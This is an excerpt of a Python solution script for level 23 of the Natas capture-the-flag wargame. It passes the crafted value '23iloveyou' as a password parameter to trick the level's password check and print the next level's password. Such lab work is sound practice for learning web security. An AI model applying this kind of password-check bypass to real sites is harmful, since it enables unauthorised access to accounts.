...
def getpass(url, auth, session, proxies=None):
    ...
    data = {"passwd":"23iloveyou"}
    response = session.get(url, auth=auth, params=data, proxies=proxies)
    ...
    print(f"[+] The password of natas24 is: {passwd[1]}")


def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas24 by tricking the password check.")
    parser.add_argument('-p', '--password', help='Password of natas23.', required=True, metavar='Password')
